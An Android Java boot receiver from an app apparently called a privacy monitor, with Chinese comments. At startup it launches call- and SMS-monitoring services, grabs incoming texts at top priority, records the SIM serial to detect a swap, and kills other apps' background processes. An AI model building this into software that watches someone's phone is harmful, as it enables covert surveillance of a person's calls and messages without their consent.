package com.privacy.monitor.receiver;

import java.util.List;
import com.privacy.monitor.base.C;
import com.privacy.monitor.domain.TaskInfo;
import com.privacy.monitor.provider.TaskInfoProvider;
import com.privacy.monitor.service.CallMonitoringService;
import com.privacy.monitor.service.SMSMonitoringService;
import com.privacy.monitor.util.Logger;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.telephony.TelephonyManager;
import android.text.TextUtils;

/**
 * 拦截开机广播
 */
public class BootReceiver extends BroadcastReceiver {

	private TelephonyManager tm;
	private SharedPreferences sp;
	private ActivityManager am ;
	
	@Override
	public void onReceive(Context context, Intent intent) {
		Logger.d("BootRectiver", "开机广播");
		
		Intent intent2 = new Intent(context,CallMonitoringService.class);
        context.startService(intent2);
		
        Intent intent3 = new Intent(context,SMSMonitoringService.class);
        context.startService(intent3);
		
        IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
	    intentFilter.setPriority(Integer.MAX_VALUE);
	    context.registerReceiver(new SMSReceiver(), intentFilter);
        
		am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
		tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		sp = context.getSharedPreferences("config",Context.MODE_PRIVATE);
		
		//得到当前手机sim卡的识别码
		String sim_serial = tm.getSimSerialNumber();
		String sim_serial_sp= sp.getString(C.SIM_SERIAL,"");
		
		if(!TextUtils.isEmpty(sim_serial_sp)){
			if(!sim_serial_sp.equals(sim_serial)){
				Logger.d("BootReceiver","SIM卡改变了....");
			}
		}else {
			Editor editor = sp.edit();
			editor.putString(C.SIM_SERIAL,sim_serial);
			editor.commit();
		}
		killTask(context);
	}
	
	/**
	 * 杀死所有正在运行的进程(除系统进程外)
	 */
	private void killTask(Context context){
		
		TaskInfoProvider provider = new TaskInfoProvider(context);
		List<TaskInfo> taskInfos = provider.getAllTasks(getProcessAppInfo(context));
		for (TaskInfo taskInfo : taskInfos) {
			String packname = taskInfo.getPackname();
			Logger.d("BootRectiver","杀死了..."+packname);
			if(!"com.privacy.monitor".equals(packname)){
				am.killBackgroundProcesses(taskInfo.getPackname());
			}
		}
	}
	
	private List<RunningAppProcessInfo> getProcessAppInfo(Context context){
		
	   return am.getRunningAppProcesses();
		
	}
	
}
